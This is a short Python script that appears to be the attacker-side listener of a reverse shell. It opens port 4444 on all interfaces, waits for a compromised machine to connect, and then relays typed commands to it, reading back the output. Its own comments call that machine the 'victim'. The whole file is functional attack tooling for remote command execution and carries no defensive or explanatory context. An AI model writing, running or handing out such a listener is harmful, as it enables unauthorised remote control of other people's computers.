import socket

# CONFIGURATION
LISTENER_IP = "0.0.0.0" # Listen on all interfaces
LISTENER_PORT = 4444    # The classic Metasploit port

def start_server():
    # 1. Create Socket
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # 2. Bind to IP/Port
    # setsockopt allows us to reuse the port immediately if we restart the script
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((LISTENER_IP, LISTENER_PORT))
    
    # 3. Listen for incoming connections
    server.listen(1)
    print(f"[*] Listening for incoming connections on {LISTENER_PORT}...")
    
    # 4. Accept connection
    client_socket, client_address = server.accept()
    print(f"[+] Connection established from {client_address[0]}")
    
    # 5. Enter Command Loop
    while True:
        # Get command from attacker
        command = input("Shell> ")
        
        if 'exit' in command:
            client_socket.send(b'exit')
            break
        
        if command.strip() == "":
            continue
            
        # Send command to victim
        client_socket.send(command.encode())
        
        # Receive result from victim (buffer size 4096 bytes)
        response = client_socket.recv(4096).decode()
        print(response)
        
    client_socket.close()
    server.close()

if __name__ == "__main__":
    start_server()